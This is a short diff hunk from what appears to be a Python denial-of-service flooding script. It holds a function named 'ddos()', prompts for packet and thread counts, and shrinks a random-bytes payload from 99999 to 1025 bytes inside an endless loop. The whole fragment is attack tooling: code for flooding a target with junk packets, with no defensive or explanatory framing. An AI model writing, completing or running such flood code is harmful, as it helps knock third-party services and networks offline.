@@ -25,7 +25,7 @@ times = int(input(" Packets:"))
 threads = int(input(" Threads:"))
 os.system("clear")
 def ddos():
-	data = random._urandom(99999)
+	data = random._urandom(1025)
 	i = random.choice(("[•]","[•]","[•]"))
 	while True:
 		try:
